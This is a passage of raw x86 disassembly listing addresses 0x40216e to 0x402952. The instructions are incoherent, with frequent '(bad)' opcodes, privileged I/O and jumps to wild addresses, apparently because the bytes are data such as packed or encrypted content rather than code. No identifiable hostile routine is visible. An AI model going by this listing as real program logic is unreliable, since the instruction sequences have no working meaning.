  40216e:	pop    ss
  40216f:	lods   al,BYTE PTR ds:[esi]
  402170:	std    
  402171:	push   es
  402172:	xor    BYTE PTR [ebx],al
  402174:	dec    esi
  402175:	jns    0x4021b1
  402177:	loop   0x4021b4
  402179:	add    dh,BYTE PTR [edx-0x27]
  40217c:	scas   eax,DWORD PTR es:[edi]
  40217d:	mov    al,ds:0x1eaef8ba
  402182:	idiv   ecx
  402184:	rol    BYTE PTR [ebx],cl
  402186:	xor    eax,0x58b2e950
  40218b:	pop    ecx
  40218c:	fimul  DWORD PTR [ebx]
  40218e:	cld    
  40218f:	js     0x4021ae
  402191:	call   0x5ba2578e
  402196:	je     0x402134
  402198:	jae    0x40212b
  40219a:	ficom  DWORD PTR [esi+0x2fe03149]
  4021a0:	lods   eax,DWORD PTR ds:[esi]
  4021a1:	jp     0x402214
  4021a3:	jp     0x402173
  4021a5:	cmp    eax,0x43e0db38
  4021aa:	jl     0x402133
  4021ac:	jo     0x4021c5
  4021ae:	xchg   ebp,eax
  4021af:	rol    BYTE PTR [esi-0x721de148],1
  4021b5:	dec    esi
  4021b6:	adc    DWORD PTR [ebx-0x5a636994],ecx
  4021bc:	adc    BYTE PTR [edi-0xa],dl
  4021bf:	mov    ds:0x81f31997,eax
  4021c4:	add    cl,BYTE PTR [ebx-0x5c]
  4021c7:	jb     0x4021c6
  4021c9:	or     ebx,0xffffff8a
  4021cc:	pop    ecx
  4021cd:	and    dl,BYTE PTR [ebp+0x54]
  4021d0:	inc    esp
  4021d1:	cmp    ebx,esi
  4021d3:	dec    eax
  4021d4:	sar    DWORD PTR [ebx+0x14cb8352],1
  4021da:	add    dh,BYTE PTR [ecx+0x42b67c39]
  4021e0:	loop   0x402196
  4021e2:	bound  esp,QWORD PTR [eax]
  4021e4:	ret    
  4021e5:	pop    es
  4021e6:	pop    es
  4021e7:	cmp    DWORD PTR [eax],eax
  4021e9:	xor    eax,0xfc070c7f
  4021ee:	pusha  
  4021ef:	mov    dl,0xac
  4021f1:	sahf   
  4021f2:	ins    BYTE PTR es:[edi],dx
  4021f3:	mov    al,ds:0xd0d29c8b
  4021f8:	dec    edi
  4021f9:	add    dh,BYTE PTR [edx+0x2d]
  4021fc:	pop    ebx
  4021fd:	mov    dl,0x14
  4021ff:	not    BYTE PTR [esi]
  402201:	out    dx,eax
  402202:	int3   
  402203:	(bad)  
  402204:	js     0x40226e
  402206:	sub    dl,al
  402208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402209:	shl    DWORD PTR [ebx+0x7f],cl
  40220c:	fdiv   st(2),st
  40220e:	(bad)  
  40220f:	ror    BYTE PTR [ecx+ebp*1-0x25585c14],cl
  402216:	clc    
  402217:	enter  0x580a,0xf5
  40221b:	and    BYTE PTR [eax+0x5c54da95],bh
  402221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402222:	js     0x4021d4
  402224:	dec    esp
  402225:	lods   eax,DWORD PTR ds:[esi]
  402226:	scas   al,BYTE PTR es:[edi]
  402227:	std    
  402228:	cwde   
  402229:	fmul   QWORD PTR [ebx-0x48]
  40222c:	popa   
  40222d:	aad    0xbd
  40222f:	dec    ebp
  402230:	push   edx
  402231:	sub    bh,al
  402233:	push   edi
  402234:	jmp    0x183a253f
  402239:	xchg   esi,eax
  40223a:	mov    bl,0x96
  40223c:	add    dl,BYTE PTR ds:0xf5b56f24
  402242:	pandn  mm2,QWORD PTR [edi+0x6d6f1bfd]
  402249:	inc    edi
  40224a:	or     bh,BYTE PTR [ecx+edi*8]
  40224d:	cmp    ch,BYTE PTR [ebp-0x7928aff0]
  402253:	sbb    eax,0x264917f0
  402258:	das    
  402259:	stos   DWORD PTR es:[edi],eax
  40225a:	out    0x7a,al
  40225c:	inc    esp
  40225d:	imul   eax,DWORD PTR [ebp+edi*8-0xd1f65f0],0x3f0fa693
  402268:	mov    ch,0xf9
  40226a:	mov    esi,0xfddc03c1
  40226f:	cmp    eax,0xdfc56544
  402274:	outs   dx,BYTE PTR ds:[esi]
  402275:	push   es
  402276:	jmp    0xef7e:0xc9bb6ad7
  40227d:	mov    eax,ds:0x36febdfa
  402282:	dec    eax
  402283:	daa    
  402284:	in     al,dx
  402285:	mov    esi,0x3a751204
  40228a:	cdq    
  40228b:	jae    0x402309
  40228d:	sahf   
  40228e:	sbb    DWORD PTR [eax+0x54d3312],ebx
  402294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402295:	inc    eax
  402296:	mov    ds:0x83e7c8ac,eax
  40229b:	pop    es
  40229c:	adc    BYTE PTR [edx],bl
  40229e:	add    esi,DWORD PTR [ebx+0x7166d275]
  4022a4:	fmul   st,st(7)
  4022a6:	ret    
  4022a7:	adc    eax,0xb381e146
  4022ac:	out    dx,eax
  4022ad:	out    dx,al
  4022ae:	push   ebp
  4022af:	push   ss
  4022b0:	mov    ds:0x425b28fe,eax
  4022b5:	push   es
  4022b6:	mov    esi,0x45ee602e
  4022bb:	clc    
  4022bc:	leave  
  4022bd:	test   DWORD PTR [eax+0x6989addf],esp
  4022c3:	adc    esp,ebx
  4022c5:	mov    bh,cl
  4022c7:	(bad)  
  4022c8:	ficomp WORD PTR ds:0xa840077d
  4022ce:	enter  0xc967,0xa1
  4022d2:	push   edx
  4022d3:	mov    ecx,0x9f607af2
  4022d8:	lods   eax,DWORD PTR ds:[esi]
  4022d9:	(bad)  
  4022da:	jmp    0x92d7c179
  4022df:	dec    edx
  4022e0:	sub    dh,BYTE PTR [edi+ebp*1+0x6097ef2b]
  4022e7:	mov    eax,0xcf16fa99
  4022ec:	inc    edi
  4022ed:	or     BYTE PTR [ebp+0x1],dh
  4022f0:	pusha  
  4022f1:	dec    ecx
  4022f2:	mov    bl,0x3c
  4022f4:	fimul  DWORD PTR [edi]
  4022f6:	(bad)  
  4022f7:	mov    al,BYTE PTR [edx]
  4022f9:	mov    ds:0xbec7f053,al
  4022fe:	xchg   edx,eax
  4022ff:	xchg   ebp,eax
  402300:	lock sub al,0x85
  402303:	lods   al,BYTE PTR ds:[esi]
  402304:	call   0x4982aa6b
  402309:	push   es
  40230a:	mov    edi,0x88ebdf6c
  40230f:	mov    ebx,0x16a27b4d
  402314:	mov    edi,DWORD PTR [ecx+0x21]
  402317:	or     DWORD PTR [edi+edx*1-0x2c],0x6f
  40231c:	pop    esi
  40231d:	es mov bl,0x55
  402320:	and    esi,esp
  402322:	inc    ecx
  402323:	ss stc 
  402325:	xchg   ebp,eax
  402326:	jb     0x40235b
  402328:	dec    edi
  402329:	xor    bl,dl
  40232b:	jecxz  0x40236f
  40232d:	test   eax,0x33bfa696
  402332:	pop    edx
  402333:	imul   edx,esi,0x1037dd1d
  402339:	xor    DWORD PTR [edx+0x5f],esi
  40233c:	push   esi
  40233d:	dec    eax
  40233e:	add    BYTE PTR [edi-0x117bb233],al
  402344:	add    DWORD PTR [ecx],eax
  402346:	xchg   ebx,eax
  402347:	retf   
  402348:	mov    ds:0x117e8f5e,al
  40234d:	adc    DWORD PTR [ebx-0x57383347],0x92789a2d
  402357:	lock imul esi,DWORD PTR [eax],0x84716343
  40235e:	fisub  DWORD PTR gs:[ecx]
  402361:	mov    dl,0xd0
  402363:	pop    ecx
  402364:	pop    eax
  402365:	shl    eax,1
  402367:	inc    edx
  402368:	cs sahf 
  40236a:	mov    al,ds:0x4e50aecd
  40236f:	jmp    0x8934:0xfd09c112
  402376:	sub    al,0xc6
  402378:	(bad)
  40237d:	bound  ebx,QWORD PTR [eax-0x40]
  402380:	(bad)  
  402381:	cdq    
  402382:	shl    BYTE PTR [eax],cl
  402384:	scas   eax,DWORD PTR es:[edi]
  402385:	ds cmp eax,0xcbac6fc5
  40238b:	and    eax,0xbec68e15
  402390:	sub    al,0x20
  402392:	sub    ah,BYTE PTR ds:0x44ac5305
  402398:	icebp  
  402399:	hlt    
  40239a:	or     DWORD PTR [ebx],0xffffffe2
  40239d:	pusha  
  40239e:	or     ax,0xd428
  4023a2:	icebp  
  4023a3:	sbb    BYTE PTR [esi+0x1d3980f6],ch
  4023a9:	dec    esi
  4023aa:	ret    0xc339
  4023ad:	push   ss
  4023ae:	jecxz  0x4023b5
  4023b0:	retf   0xc194
  4023b3:	in     eax,0xc
  4023b5:	and    ecx,DWORD PTR [ecx]
  4023b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b8:	mov    edi,0x57210078
  4023bd:	mov    ah,bl
  4023bf:	and    eax,0x25e6a8d1
  4023c4:	iret   
  4023c5:	push   ecx
  4023c6:	lods   al,BYTE PTR ds:[esi]
  4023c7:	add    DWORD PTR [eax-0x4d7ec639],esp
  4023cd:	mov    ds:0x6d21ee40,al
  4023d2:	popa   
  4023d3:	xlat   BYTE PTR ds:[ebx]
  4023d4:	sub    bh,BYTE PTR [ecx]
  4023d6:	imul   ebp,esp,0xfffffff1
  4023d9:	pop    ss
  4023da:	inc    eax
  4023db:	dec    esi
  4023dc:	add    eax,0xf4c4d8e4
  4023e1:	pop    es
  4023e2:	fdivr  DWORD PTR [ebx-0x5c29de00]
  4023e8:	int3   
  4023e9:	scas   al,BYTE PTR es:[edi]
  4023ea:	sub    DWORD PTR [edx],edx
  4023ec:	push   cs
  4023ed:	push   cs
  4023ee:	push   ebp
  4023ef:	add    BYTE PTR [ebx+0x24],ch
  4023f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023f3:	jecxz  0x40243d
  4023f5:	addr16 iret 
  4023f7:	rcl    BYTE PTR [eax+ebp*2+0x66baa048],cl
  4023fe:	(bad)  
  4023ff:	and    eax,0x6230b459
  402404:	dec    esi
  402405:	retf   
  402406:	and    DWORD PTR [ebp-0x13],edi
  402409:	push   ss
  40240a:	adc    al,0x77
  40240c:	sbb    DWORD PTR [ebx-0x42b018d0],ebp
  402412:	cmp    DWORD PTR [edi+0x7253edc8],0x14e6351a
  40241c:	push   edx
  40241d:	push   esp
  40241e:	add    dh,BYTE PTR [edx]
  402420:	push   ds
  402421:	sub    DWORD PTR [eax-0x58e233b],ebp
  402427:	or     esp,DWORD PTR [eax]
  402429:	inc    esp
  40242a:	shr    ebp,cl
  40242c:	xor    al,0xf7
  40242e:	dec    edi
  40242f:	push   ecx
  402430:	inc    edi
  402431:	push   0x44
  402433:	or     BYTE PTR [ebx-0x70],ah
  402436:	jge    0x402479
  402438:	das    
  402439:	push   esp
  40243a:	out    0xcf,eax
  40243c:	push   ebx
  40243d:	xor    eax,ebp
  40243f:	adc    bh,BYTE PTR [edx-0x17]
  402442:	loopne 0x4023ed
  402444:	pop    edi
  402445:	hlt    
  402446:	ins    DWORD PTR es:[edi],dx
  402447:	test   eax,0xf3d1e0f9
  40244c:	mov    eax,ds:0x3097a559
  402451:	add    BYTE PTR [edx+0x5d74fa96],bl
  402457:	shl    ebp,0x1a
  40245a:	or     al,ah
  40245c:	add    eax,0x4d8b5c5a
  402461:	inc    eax
  402462:	test   eax,0xc1488e95
  402467:	mov    ebx,0xe66700f2
  40246c:	cmp    al,0x5d
  40246e:	cmp    ebx,DWORD PTR [ebx]
  402470:	outs   dx,DWORD PTR ds:[esi]
  402471:	mov    ah,0x22
  402473:	mov    ch,bl
  402475:	jecxz  0x402403
  402477:	sub    ah,dl
  402479:	sbb    eax,0x96ee6846
  40247e:	push   cs
  40247f:	sbb    ecx,ebx
  402481:	inc    eax
  402482:	xchg   edx,eax
  402483:	aas    
  402484:	repz call 0x9f2fa5b2
  40248a:	sub    al,0x43
  40248c:	cmp    edx,DWORD PTR [esi-0xf]
  40248f:	jne    0x402490
  402491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402492:	sub    BYTE PTR [ebx+0x7f5151d1],bh
  402498:	iret   
  402499:	pop    ss
  40249a:	and    dl,BYTE PTR [esp+edi*1+0x7d3969c8]
  4024a1:	dec    ecx
  4024a2:	js     0x40242a
  4024a4:	cmp    al,0x96
  4024a6:	inc    edi
  4024a7:	ins    DWORD PTR es:[edi],dx
  4024a8:	scas   al,BYTE PTR es:[edi]
  4024a9:	mov    eax,ds:0x734039f0
  4024ae:	cdq    
  4024af:	cwde   
  4024b0:	popa   
  4024b1:	dec    eax
  4024b2:	jo     0x402498
  4024b4:	xor    esp,DWORD PTR [ecx+0x3c7b9936]
  4024ba:	sub    BYTE PTR [eax+eiz*1],dl
  4024bd:	jecxz  0x4024dd
  4024bf:	mov    edx,0xd4f3992f
  4024c4:	xor    al,BYTE PTR [ecx]
  4024c6:	iret   
  4024c7:	gs adc al,0x13
  4024ca:	inc    eax
  4024cb:	add    al,0xb3
  4024cd:	xor    DWORD PTR [edi+0x181e02a6],ecx
  4024d3:	call   0xd5539c98
  4024d8:	iret   
  4024d9:	neg    DWORD PTR [esi]
  4024db:	dec    edi
  4024dc:	sub    dl,BYTE PTR [ebx+0xa]
  4024df:	mov    dh,0x32
  4024e1:	test   ebx,eax
  4024e3:	inc    edi
  4024e4:	mov    ds:0x64a7964,eax
  4024e9:	cmp    cl,BYTE PTR [eax-0x38dc1b51]
  4024ef:	lahf   
  4024f0:	xchg   esi,eax
  4024f1:	cmp    DWORD PTR [ebp-0x1c],esi
  4024f4:	mov    ah,0x67
  4024f6:	push   esi
  4024f7:	scas   al,BYTE PTR es:[edi]
  4024f8:	cli    
  4024f9:	aaa    
  4024fa:	sar    dh,0x64
  4024fd:	inc    ebp
  4024fe:	or     al,dh
  402500:	int    0x80
  402502:	hlt    
  402503:	jle    0x402503
  402505:	and    DWORD PTR [edx-0x7169c08f],ebp
  40250b:	xchg   dl,bh
  40250d:	add    ebx,ebp
  40250f:	mov    ecx,0x10d62b69
  402514:	std    
  402515:	test   al,0xe1
  402517:	adc    ebp,edi
  402519:	test   al,0x24
  40251b:	ret    0x82a6
  40251e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251f:	bound  ebx,QWORD PTR [edx-0xc]
  402522:	bnd jg 0x4024d3
  402525:	ss xor al,0x49
  402528:	cmp    al,0xca
  40252a:	mov    ah,BYTE PTR [eax+edi*2+0x6a]
  40252e:	or     DWORD PTR [ebx+ebp*4],ecx
  402531:	sub    cl,BYTE PTR [esi]
  402533:	sbb    al,0x78
  402535:	lods   eax,DWORD PTR ds:[esi]
  402536:	push   esi
  402537:	adc    bl,BYTE PTR [edx-0x1d1e0d43]
  40253d:	sub    eax,DWORD PTR [edx]
  40253f:	sub    ebp,DWORD PTR cs:[edi+0x1]
  402543:	cld    
  402544:	cli    
  402545:	loop   0x402536
  402547:	or     DWORD PTR [edx+ebx*2],ecx
  40254a:	fiadd  DWORD PTR [ebx-0x5f4c7cba]
  402550:	adc    al,0x2a
  402552:	in     al,dx
  402553:	xchg   BYTE PTR [edi+ebx*1+0x26],bl
  402557:	cmp    esi,DWORD PTR [eax-0x700803ca]
  40255d:	add    BYTE PTR [ecx],0xf6
  402560:	pop    edi
  402561:	iret   
  402562:	push   eax
  402563:	test   al,0x6d
  402565:	push   esi
  402566:	sub    al,0xa8
  402568:	xor    DWORD PTR [edi],esi
  40256a:	cdq    
  40256b:	pop    edi
  40256c:	cli    
  40256d:	test   ah,dl
  40256f:	(bad)  
  402570:	jmp    0x4025b0
  402572:	stc    
  402573:	cli    
  402574:	cld    
  402575:	adc    dh,BYTE PTR [esi]
  402577:	rol    BYTE PTR [ecx-0x47],1
  40257a:	jg     0x40258b
  40257c:	mov    ah,0x35
  40257e:	into   
  40257f:	pop    ebx
  402580:	js     0x402579
  402582:	mov    edx,DWORD PTR [ebx-0x45]
  402585:	push   0x68e8c4f9
  40258a:	(bad)  
  40258b:	mov    esi,0x87fd83d5
  402590:	xor    bh,cl
  402592:	or     BYTE PTR fs:[esi+0x5e092e7e],0xd0
  40259a:	mov    esi,0xc5e96795
  40259f:	add    eax,0xd89a553d
  4025a4:	(bad)  
  4025a6:	shr    BYTE PTR [edi+0x77],cl
  4025a9:	mov    fs,WORD PTR [ebx+0x3]
  4025ac:	stos   BYTE PTR es:[edi],al
  4025ad:	adc    eax,0x7ec1c672
  4025b2:	inc    BYTE PTR [edx-0x1c52a0ec]
  4025b8:	lds    ebx,FWORD PTR [ecx+0x1c22994f]
  4025be:	and    ecx,edx
  4025c0:	mov    cl,0xa1
  4025c2:	mov    edx,0x744686be
  4025c7:	pusha  
  4025c8:	fwait
  4025c9:	stos   BYTE PTR es:[edi],al
  4025ca:	adc    esi,DWORD PTR [ebx-0x2c]
  4025cd:	cmp    al,0xd
  4025cf:	idiv   BYTE PTR [ebp+0x6dccd945]
  4025d5:	pop    edx
  4025d6:	in     al,dx
  4025d7:	clc    
  4025d8:	mov    eax,0xe42b35b7
  4025dd:	mov    dl,0xa8
  4025df:	mov    esi,0xca86e5c2
  4025e4:	xor    ecx,eax
  4025e6:	call   0x26f5:0xea4f4cc9
  4025ed:	or     edi,edi
  4025ef:	sbb    DWORD PTR [ebp+0x7a],edi
  4025f2:	xor    eax,0xb7a9a7a5
  4025f7:	add    bl,dl
  4025f9:	pop    esi
  4025fa:	call   0x203bf778
  4025ff:	inc    DWORD PTR [eax]
  402601:	pop    ebp
  402602:	arpl   si,di
  402604:	ror    DWORD PTR [ebp-0x220abdab],1
  40260a:	fist   DWORD PTR [ebx+ecx*8-0xdb32624]
  402611:	sub    DWORD PTR [ebx+0x7],ecx
  402614:	bound  eax,QWORD PTR [ebx]
  402616:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  402618:	inc    edi
  402619:	in     eax,dx
  40261a:	imul   ecx,DWORD PTR [edx+0x4ff9d6ee],0xffffffce
  402621:	stos   BYTE PTR es:[edi],al
  402622:	repz sbb bh,BYTE PTR [eax]
  402625:	inc    edx
  402626:	ins    DWORD PTR es:[edi],dx
  402627:	push   0x64
  402629:	pusha  
  40262a:	js     0x402629
  40262c:	mov    ch,0x64
  40262e:	sbb    al,0x24
  402630:	adc    al,0x96
  402632:	inc    ecx
  402633:	stc    
  402634:	and    ecx,DWORD PTR [edx]
  402636:	fs stos DWORD PTR es:[edi],eax
  402638:	mov    bh,0x58
  40263a:	fcmovnb st,st(5)
  40263c:	jae    0x4025de
  40263e:	mov    bh,0xb7
  402640:	push   eax
  402641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402642:	call   0x999611b7
  402647:	fimul  DWORD PTR [edi+0x78bcd431]
  40264d:	int3   
  40264e:	jmp    0x40261c
  402650:	cs jae 0x4026c6
  402653:	aas    
  402654:	jo     0x4025ec
  402656:	cmp    bh,BYTE PTR [edx-0x5a]
  402659:	fist   WORD PTR [eax-0x59]
  40265c:	xchg   ebx,eax
  40265d:	mov    ebp,0x55269987
  402662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402663:	jno    0x4026b4
  402665:	ss pop ss
  402667:	push   eax
  402668:	mov    ds:0xce43f9a4,eax
  40266d:	push   ebp
  40266e:	nop
  40266f:	std    
  402670:	ror    BYTE PTR [esi-0x7643a177],0xdf
  402677:	test   DWORD PTR [esi],0x3b4bcb10
  40267d:	and    dh,BYTE PTR [esi-0x35]
  402680:	loopne 0x4026f3
  402682:	fmul   QWORD PTR [edx+0x4d]
  402685:	adc    al,0xa
  402687:	mov    WORD PTR [eax],ds
  402689:	jbe    0x402707
  40268b:	xchg   ecx,eax
  40268c:	xlat   BYTE PTR ds:[ebx]
  40268d:	jl     0x402652
  40268f:	xchg   BYTE PTR ds:0x7999b8bb,bh
  402695:	repz mov eax,0x48980d26
  40269b:	ins    DWORD PTR es:[edi],dx
  40269c:	xchg   DWORD PTR [esi],ebp
  40269e:	push   esp
  40269f:	push   eax
  4026a0:	add    BYTE PTR [esi-0x715179e1],cl
  4026a6:	jno    0x40264c
  4026a8:	and    al,0xe2
  4026aa:	push   ss
  4026ab:	ror    DWORD PTR [edi-0x3f626f62],cl
  4026b1:	jbe    0x4026b8
  4026b3:	pop    ebx
  4026b4:	mov    eax,ds:0x5f029791
  4026b9:	test   eax,edi
  4026bb:	jo     0x4026f8
  4026bd:	xchg   BYTE PTR [edx+0x11],ch
  4026c0:	ja     0x402717
  4026c2:	je     0x4026e8
  4026c4:	(bad)  
  4026c5:	outs   dx,DWORD PTR ds:[esi]
  4026c6:	push   edx
  4026c7:	and    BYTE PTR [esi],dh
  4026c9:	aas    
  4026ca:	jge    0x402737
  4026cc:	aam    0xa5
  4026ce:	(bad)  
  4026cf:	dec    ebx
  4026d0:	dec    ebp
  4026d1:	cmp    ah,BYTE PTR [eax]
  4026d3:	cld    
  4026d4:	and    DWORD PTR [ecx],edi
  4026d6:	jle    0x402676
  4026d8:	sbb    edx,esi
  4026da:	test   BYTE PTR [ecx],ch
  4026dc:	jecxz  0x4026d5
  4026de:	or     dh,0x37
  4026e1:	fld    TBYTE PTR [ebp+0x63c53bad]
  4026e7:	push   0xfffffffd
  4026e9:	or     BYTE PTR [ebp+0x50],dh
  4026ec:	dec    ebp
  4026ed:	jecxz  0x40271f
  4026ef:	mov    edi,0x47613025
  4026f4:	or     edi,eax
  4026f6:	mov    bh,0xf3
  4026f8:	arpl   WORD PTR [ecx-0x5f],bx
  4026fb:	lock push 0xffffffa8
  4026fe:	push   ds
  4026ff:	data16 mov dh,0xd5
  402702:	fsubrp st(1),st
  402704:	fidiv  DWORD PTR [ecx]
  402706:	add    eax,0x1903a2ef
  40270b:	daa    
  40270c:	outs   dx,DWORD PTR ds:[esi]
  40270d:	daa    
  40270e:	dec    eax
  40270f:	and    eax,0x602f52ef
  402714:	add    DWORD PTR [ebx+edi*8],esi
  402717:	mov    bh,0xf0
  402719:	call   0x73e4709b
  40271e:	addr16 mov dl,0x2d
  402721:	out    0x24,eax
  402723:	xchg   ecx,eax
  402724:	fs in  eax,0xe4
  402727:	and    eax,0x79a226a9
  40272c:	fnstenv [ebx+ebp*2+0x5f]
  402730:	test   eax,0x631377db
  402735:	(bad)  
  402736:	sub    al,0x92
  402738:	jnp    0x402731
  40273a:	ret    
  40273b:	and    esp,DWORD PTR [edi+0x5c824662]
  402741:	and    bh,BYTE PTR fs:[eax]
  402744:	shl    BYTE PTR [eax+0x2ca0d720],0xae
  40274b:	inc    esi
  40274c:	add    al,bh
  40274e:	xchg   edx,eax
  40274f:	sub    DWORD PTR [ecx],ecx
  402751:	cs fild QWORD PTR cs:[ecx-0x46958bdb]
  402759:	pop    eax
  40275a:	cmp    eax,0x6503e01
  40275f:	jns    0x40272f
  402761:	mov    ah,0x74
  402763:	push   eax
  402764:	pusha  
  402765:	rcl    DWORD PTR [ebp-0x5658655b],0xca
  40276c:	cmp    ecx,DWORD PTR [edi]
  40276e:	(bad)  
  40276f:	mov    ds:0xdcd86616,eax
  402774:	(bad)  
  402775:	sub    ah,ch
  402777:	xchg   ebp,eax
  402778:	or     eax,0xaa63e9e5
  40277d:	ret    0xf337
  402780:	(bad)  
  402781:	mov    edx,0x3b64585
  402786:	mov    dh,0x4b
  402788:	sti    
  402789:	and    al,0x89
  40278b:	mov    dh,0xa7
  40278d:	loope  0x402768
  40278f:	dec    ebx
  402790:	inc    edi
  402791:	and    eax,0x2ce531f2
  402796:	retf   0x8ba9
  402799:	aam    0x76
  40279b:	test   cl,al
  40279d:	jne    0x40278e
  40279f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027a0:	adc    DWORD PTR [esi+0x57b1cf7f],edi
  4027a6:	dec    eax
  4027a7:	sub    eax,0xa287853a
  4027ac:	mov    dl,0x49
  4027ae:	xchg   ecx,eax
  4027af:	and    eax,0x3124bb48
  4027b4:	loopne 0x402754
  4027b6:	adc    BYTE PTR es:[esi-0x50],dh
  4027ba:	fsub   QWORD PTR [ecx+esi*1+0x4f]
  4027be:	sahf   
  4027bf:	pop    DWORD PTR [esi+ebx*8+0x7ae368d8]
  4027c6:	lahf   
  4027c7:	jg     0x402848
  4027c9:	nop
  4027ca:	jge    0x4027f4
  4027cc:	cld    
  4027cd:	dec    ebx
  4027ce:	sub    dl,BYTE PTR [edi]
  4027d0:	jge    0x4027b4
  4027d2:	dec    ecx
  4027d3:	shl    DWORD PTR [eax],1
  4027d5:	pop    es
  4027d6:	jmp    0x4027e6
  4027d8:	adc    edi,DWORD PTR [ebx]
  4027da:	lods   al,BYTE PTR ds:[esi]
  4027db:	jmp    0xa1300232
  4027e0:	mov    eax,0x5829ee43
  4027e5:	or     bl,BYTE PTR [edx+0x60]
  4027e8:	scas   eax,DWORD PTR es:[edi]
  4027e9:	in     eax,0xe0
  4027eb:	out    0x9c,eax
  4027ed:	pop    esi
  4027ee:	mov    bh,0xc
  4027f0:	ret    0x5563
  4027f3:	xchg   ebp,esi
  4027f5:	sub    eax,0x78cd7ec7
  4027fa:	icebp  
  4027fb:	in     eax,0xac
  4027fd:	(bad)  
  4027ff:	imul   edx,DWORD PTR [ebx],0xffffffcf
  402802:	gs dec eax
  402804:	leave  
  402805:	lods   al,BYTE PTR ds:[esi]
  402806:	mov    dh,0x70
  402808:	jmp    0x331bd914
  40280d:	dec    ecx
  40280e:	xchg   esi,eax
  40280f:	ror    dh,1
  402811:	push   ecx
  402812:	push   eax
  402813:	cmp    BYTE PTR [ebp-0x6426b6ad],0xdc
  40281a:	mov    ds:0xf80d1cb8,al
  40281f:	jno    0x402809
  402821:	mov    bl,0xa4
  402823:	fnstcw WORD PTR [ebx+eiz*1]
  402826:	into   
  402827:	popa   
  402828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40282a:	out    dx,al
  40282b:	jl     0x402821
  40282d:	cdq    
  40282e:	test   al,0xc6
  402830:	xor    eax,0xcf2916dc
  402835:	and    eax,0xa91485f2
  40283a:	push   edx
  40283b:	add    BYTE PTR [esi-0x4f0feb4d],ch
  402841:	push   esp
  402842:	pop    ebx
  402843:	mov    ecx,0xfb088558
  402848:	cmp    eax,0x6ee92646
  40284d:	mov    ch,0x43
  40284f:	outs   dx,BYTE PTR ds:[esi]
  402850:	xor    bl,BYTE PTR [ebx+0x3bf97ce1]
  402856:	pusha  
  402857:	(bad)  
  402858:	icebp  
  402859:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40285b:	neg    DWORD PTR [esi-0x33aba22c]
  402861:	mov    edx,0xf5f5066e
  402866:	pop    edx
  402867:	add    DWORD PTR [ecx-0x70958fd1],ebp
  40286d:	jg     0x40285d
  40286f:	ret    0x19c7
  402872:	cmp    eax,esp
  402874:	dec    ecx
  402875:	and    BYTE PTR [ecx+0x10b4103e],cl
  40287b:	push   ebp
  40287c:	mov    bl,0xc8
  40287e:	sar    DWORD PTR [edi],0x50
  402881:	jb     0x4028e7
  402883:	pushf  
  402884:	enter  0x4496,0xb3
  402888:	shl    DWORD PTR [esp+ebp*4],0x62
  40288c:	cwde   
  40288d:	mov    al,0x85
  40288f:	adc    BYTE PTR [esi+0x5e],0xb9
  402893:	retf   
  402894:	lds    esp,FWORD PTR [eax]
  402896:	mov    ds:0x4587cf3e,al
  40289b:	cmp    BYTE PTR [ebx],dh
  40289d:	fcom   DWORD PTR [ebx+0x766e1cb5]
  4028a3:	add    dh,BYTE PTR [esi-0x6a]
  4028a6:	push   0x3
  4028a8:	dec    esp
  4028a9:	shl    ebp,0x2b
  4028ac:	push   esp
  4028ad:	pop    es
  4028ae:	in     eax,0xf7
  4028b0:	into   
  4028b1:	enter  0x797d,0x68
  4028b5:	stos   DWORD PTR es:[edi],eax
  4028b6:	in     al,0x67
  4028b8:	xchg   DWORD PTR [eax-0x3b],ebx
  4028bb:	add    eax,0xfb0ebf26
  4028c0:	call   0x6f588a41
  4028c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c6:	and    dl,dh
  4028c8:	stos   BYTE PTR es:[edi],al
  4028c9:	inc    edx
  4028ca:	pop    ss
  4028cb:	icebp  
  4028cc:	adc    DWORD PTR gs:[ebp-0x512bec10],ebx
  4028d3:	pop    es
  4028d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028d5:	jo     0x40290b
  4028d7:	dec    eax
  4028d8:	jno    0x4028c4
  4028da:	or     eax,0x2e999e0e
  4028df:	add    al,0xbd
  4028e1:	fbstp  TBYTE PTR [edx-0x2f]
  4028e4:	jo     0x4028ae
  4028e6:	add    eax,0x12f729a3
  4028eb:	fbstp  TBYTE PTR [ebx]
  4028ed:	pop    edi
  4028ee:	xor    DWORD PTR [edx-0xc],esi
  4028f1:	mov    bh,0x5d
  4028f3:	jmp    0x40293b
  4028f5:	daa    
  4028f6:	enter  0xa81f,0x9b
  4028fa:	inc    edi
  4028fb:	lea    esi,[ecx]
  4028fd:	retf   
  4028fe:	sub    eax,0xe2ad837b
  402903:	cdq    
  402904:	dec    ecx
  402905:	int    0xdd
  402907:	(bad)  
  402908:	push   ecx
  402909:	rcl    ah,1
  40290b:	cmp    al,0xb7
  40290d:	mov    ds:0xe5814428,eax
  402912:	in     al,0x8b
  402914:	bound  eax,QWORD PTR [esi-0x1]
  402917:	das    
  402918:	push   edx
  402919:	mov    DWORD PTR [ebp+0x31],esp
  40291c:	shl    BYTE PTR [esi-0x6e],1
  40291f:	mov    edi,0xcc0a8d6a
  402924:	mov    DWORD PTR [eax],eax
  402926:	adc    BYTE PTR [ecx+ecx*2+0x2d],al
  40292a:	add    esp,DWORD PTR [ebp-0x147a8349]
  402930:	xor    DWORD PTR [esp+ebx*8],0x6acf5a6e
  402937:	shl    DWORD PTR [ebx+0x57b1cc35],1
  40293d:	test   al,0xa6
  40293f:	cmp    DWORD PTR [eax],esi
  402941:	xor    esi,ecx
  402943:	push   es
  402944:	jmp    0x3161d696
  402949:	daa    
  40294a:	lds    edx,FWORD PTR [edi-0x4eda7b89]
  402950:	std    
  402951:	pop    edx
  402952:	jle    0x402929
